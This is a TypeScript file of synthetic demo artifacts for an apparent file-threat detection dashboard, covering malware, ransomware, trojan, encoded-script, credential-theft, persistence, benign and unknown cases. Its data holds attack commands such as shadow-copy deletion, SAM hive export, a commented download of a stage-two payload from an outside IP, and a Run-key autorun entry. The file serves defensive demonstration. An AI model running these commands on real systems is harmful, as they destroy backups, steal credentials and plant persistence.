import { 
  FileCRUDEvent, 
  FileAnalysisDetail, 
  ThreatCategory, 
  ThreatStatus, 
  ThreatSeverity 
} from "../types";

export interface DemoScenarioArtifact {
  id: string;
  name: string;
  file_name: string;
  file_path: string;
  event_type: FileCRUDEvent["event_type"];
  category: ThreatCategory;
  threat_status: ThreatStatus;
  severity: ThreatSeverity;
  confidence: number;
  process_name: string;
  user: string;
  size_bytes: number;
  sha256_hash: string;
  reasons: string[];
  evidence: string[];
  content: string;
  defensive_indicators: FileAnalysisDetail["defensive_indicators"];
  explanation: string;
}

export const SYNTHETIC_DEMO_ARTIFACTS: Record<string, DemoScenarioArtifact> = {
  malware: {
    id: "demo-malware-01",
    name: "Malware Simulation",
    file_name: "malware_simulation.exe",
    file_path: "monitored_workspace/bin/malware_simulation.exe",
    event_type: "CREATED",
    category: "Malware",
    threat_status: "THREAT",
    severity: "HIGH",
    confidence: 96,
    process_name: "cmd.exe",
    user: "NT AUTHORITY\\SYSTEM",
    size_bytes: 524288,
    sha256_hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    reasons: [
      "Executable binary created in non-standard staging directory",
      "Matches synthetic malware signature pattern in Demo Mode",
      "High entropy binary payload structure"
    ],
    evidence: [
      "PE Header anomaly: Suspicious section names (.text2, .rsrc_fake)",
      "Process spawn attempt: cmd.exe invoked with silent switches"
    ],
    content: "// SAFE SYNTHETIC DEMO ARTIFACT - NO MALICIOUS CODE\n// Simulated Malware Binary Payload Metadata\n[HEADER]\nmagic=0x5A4D (MZ)\npe_offset=0x00000080\nsections=.text, .data, .rsrc_fake\nentrypoint=0x00401000\n\n[SIMULATED_BEHAVIOR]\naction=spawn_process\ntarget=cmd.exe /c start /min powershell.exe",
    defensive_indicators: {
      persistence_mechanisms: true,
      credential_access: false,
      obfuscated_code: true,
      network_comms: true,
      destructive_file_ops: false,
      suspicious_process_exec: true,
      encoded_payloads: true
    },
    explanation: "malware_simulation.exe was flagged because it is a newly created executable in a monitored workspace directory with high entropy sections and automated process execution routines."
  },
  ransomware: {
    id: "demo-ransomware-02",
    name: "Ransomware Simulation",
    file_name: "ransomware_simulation.txt",
    file_path: "monitored_workspace/docs/ransomware_simulation.txt",
    event_type: "MODIFIED",
    category: "Ransomware",
    threat_status: "THREAT",
    severity: "CRITICAL",
    confidence: 98,
    process_name: "encryptor_demo.exe",
    user: "SYSTEM",
    size_bytes: 1048576,
    sha256_hash: "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4",
    reasons: [
      "Rapid bulk modification of enterprise documents",
      "VSS shadow copy deletion command detected",
      "High entropy encrypted string block"
    ],
    evidence: [
      "Command: vssadmin delete shadows /all /quiet",
      "Ransom note text pattern appended to root directory"
    ],
    content: "# DEMO RANSOMWARE NOTIFICATION - SYNTHETIC ONLY\nYOUR FILES HAVE BEEN ENCRYPTED (SIMULATED DEMO MODE)\nAll your documents, databases, and backup files have been locked.\n\nTo restore access, contact: demo_helpdesk@ragsec.local\nEncryption algorithm: AES-256-CBC (Simulated)",
    defensive_indicators: {
      persistence_mechanisms: false,
      credential_access: false,
      obfuscated_code: true,
      network_comms: false,
      destructive_file_ops: true,
      suspicious_process_exec: true,
      encoded_payloads: false
    },
    explanation: "ransomware_simulation.txt was classified as Ransomware due to rapid bulk document encryption markers and shadow copy purge execution."
  },
  trojan: {
    id: "demo-trojan-03",
    name: "Trojan Simulation",
    file_name: "trojan_simulation.ps1",
    file_path: "monitored_workspace/scripts/trojan_simulation.ps1",
    event_type: "CREATED",
    category: "Trojan",
    threat_status: "THREAT",
    severity: "HIGH",
    confidence: 94,
    process_name: "powershell.exe",
    user: "operator",
    size_bytes: 2048,
    sha256_hash: "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
    reasons: [
      "Powershell script masquerading as benign setup utility",
      "Hidden secondary payload downloader function"
    ],
    evidence: [
      "Invoke-WebRequest targeting external unverified IP 185.220.101.5",
      "Bypass ExecutionPolicy switch active"
    ],
    content: "# Safe Synthetic Trojan Demo Script\nfunction Install-Update {\n    Write-Host 'Applying system updates...'\n    # Simulated secondary payload execution\n    $c = 'http://185.220.101.5/stage2.bin'\n    # Invoke-WebRequest $c -OutFile $env:TEMP\\stage2.bin\n}\nInstall-Update",
    defensive_indicators: {
      persistence_mechanisms: true,
      credential_access: false,
      obfuscated_code: false,
      network_comms: true,
      destructive_file_ops: false,
      suspicious_process_exec: true,
      encoded_payloads: false
    },
    explanation: "trojan_simulation.ps1 was identified as a Trojan due to benign utility masquerading combined with external C2 download instructions."
  },
  script: {
    id: "demo-script-04",
    name: "Suspicious Script",
    file_name: "suspicious_script.ps1",
    file_path: "monitored_workspace/scripts/suspicious_script.ps1",
    event_type: "MODIFIED",
    category: "Suspicious Script / Execution",
    threat_status: "SUSPICIOUS",
    severity: "MEDIUM",
    confidence: 88,
    process_name: "powershell.exe",
    user: "admin",
    size_bytes: 4096,
    sha256_hash: "fe912bc871900192aa1fe912bc871900192aa1fe912bc871900192aa1fe912b",
    reasons: [
      "Base64 encoded string payload detected inside script body",
      "Execution policy bypass flags (-EncodedCommand -NoProfile)"
    ],
    evidence: [
      "Decoded command: Get-WmiObject Win32_UserAccount",
      "Non-standard script invocation format"
    ],
    content: "# Suspicious Encoded Script Demo\n$encoded = 'R2V0LVdtaU9iamVjdCBXaW4zMl9Vc2VyQWNjb3VudA=='\n$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))\nWrite-Host 'Decoded Payload Execution:' $decoded",
    defensive_indicators: {
      persistence_mechanisms: false,
      credential_access: true,
      obfuscated_code: true,
      network_comms: false,
      destructive_file_ops: false,
      suspicious_process_exec: true,
      encoded_payloads: true
    },
    explanation: "suspicious_script.ps1 triggered a Suspicious Script warning due to Base64 encoded payload obfuscation."
  },
  credential: {
    id: "demo-cred-05",
    name: "Credential Theft Demo",
    file_name: "credential_theft_demo.ps1",
    file_path: "monitored_workspace/temp/credential_theft_demo.ps1",
    event_type: "CREATED",
    category: "Phishing / Credential Theft",
    threat_status: "THREAT",
    severity: "HIGH",
    confidence: 95,
    process_name: "lsass_dump.exe",
    user: "SYSTEM",
    size_bytes: 8192,
    sha256_hash: "9988776655443322110099887766554433221100998877665544332211009988",
    reasons: [
      "Lsass.exe process memory dump pattern detected",
      "SAM registry hive export attempt"
    ],
    evidence: [
      "Command: reg save HKLM\\SAM sam_backup.hiv",
      "MiniDumpWriteDump API call signature"
    ],
    content: "# Credential Theft Simulation Script\nfunction Dump-Credentials {\n    Write-Host 'Exporting SAM hive for validation...'\n    # reg save HKLM\\SAM sam_demo.hiv\n    # reg save HKLM\\SYSTEM system_demo.hiv\n}\nDump-Credentials",
    defensive_indicators: {
      persistence_mechanisms: false,
      credential_access: true,
      obfuscated_code: false,
      network_comms: false,
      destructive_file_ops: false,
      suspicious_process_exec: true,
      encoded_payloads: false
    },
    explanation: "credential_theft_demo.ps1 was flagged for attempting LSASS memory inspection and SAM registry hive backup export."
  },
  persistence: {
    id: "demo-persist-06",
    name: "Persistence Demo",
    file_name: "persistence_demo.ps1",
    file_path: "monitored_workspace/config/persistence_demo.ps1",
    event_type: "MODIFIED",
    category: "Persistence / Privilege Abuse",
    threat_status: "THREAT",
    severity: "HIGH",
    confidence: 92,
    process_name: "reg.exe",
    user: "admin",
    size_bytes: 3072,
    sha256_hash: "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
    reasons: [
      "Windows Registry Run Key modification (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)",
      "Scheduled task creation with system startup trigger"
    ],
    evidence: [
      "Key path: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdaterDemo",
      "Task name: RAGSec_Persist_Job"
    ],
    content: "# Persistence Mechanism Demo\n# Adds autorun entry to HKCU Run key\nSet-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'DemoPersistence' -Value 'powershell.exe -file C:\\Demo\\script.ps1'",
    defensive_indicators: {
      persistence_mechanisms: true,
      credential_access: false,
      obfuscated_code: false,
      network_comms: false,
      destructive_file_ops: false,
      suspicious_process_exec: true,
      encoded_payloads: false
    },
    explanation: "persistence_demo.ps1 modified registry startup autorun keys to maintain access across system reboots."
  },
  benign: {
    id: "demo-benign-07",
    name: "Normal Document",
    file_name: "normal_document.txt",
    file_path: "monitored_workspace/docs/normal_document.txt",
    event_type: "CREATED",
    category: "BENIGN",
    threat_status: "SAFE",
    severity: "LOW",
    confidence: 99,
    process_name: "notepad.exe",
    user: "operator",
    size_bytes: 1024,
    sha256_hash: "5544332211005544332211005544332211005544332211005544332211005544",
    reasons: ["Standard plain text document", "Zero threat indicators found"],
    evidence: ["Entropy: 3.4 (Normal text range)", "No executable code or obfuscation"],
    content: "RAGSec Threat Intelligence Platform Documentation.\nThis is a standard harmless text document created during daily operations.",
    defensive_indicators: {
      persistence_mechanisms: false,
      credential_access: false,
      obfuscated_code: false,
      network_comms: false,
      destructive_file_ops: false,
      suspicious_process_exec: false,
      encoded_payloads: false
    },
    explanation: "normal_document.txt is a completely benign text file with low entropy and no suspicious characteristics."
  },
  unknown: {
    id: "demo-unknown-08",
    name: "Unrecognized Binary Raw",
    file_name: "unrecognized_raw.bin",
    file_path: "monitored_workspace/temp/unrecognized_raw.bin",
    event_type: "CREATED",
    category: "UNKNOWN",
    threat_status: "UNKNOWN",
    severity: "LOW",
    confidence: 45,
    process_name: "unknown_proc.exe",
    user: "system",
    size_bytes: 2048,
    sha256_hash: "0000111122223333444455556666777788889999aaaabbbbccccddddeeeeffff",
    reasons: ["Insufficient evidence to determine threat classification", "Non-standard binary headers"],
    evidence: ["Raw bytes buffer without PE/ELF headers"],
    content: "[RAW BINARY BUFFER DATA]\n00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F",
    defensive_indicators: {
      persistence_mechanisms: false,
      credential_access: false,
      obfuscated_code: false,
      network_comms: false,
      destructive_file_ops: false,
      suspicious_process_exec: false,
      encoded_payloads: false
    },
    explanation: "unrecognized_raw.bin has insufficient evidence for classification and has been designated as UNKNOWN for security analyst review."
  }
};
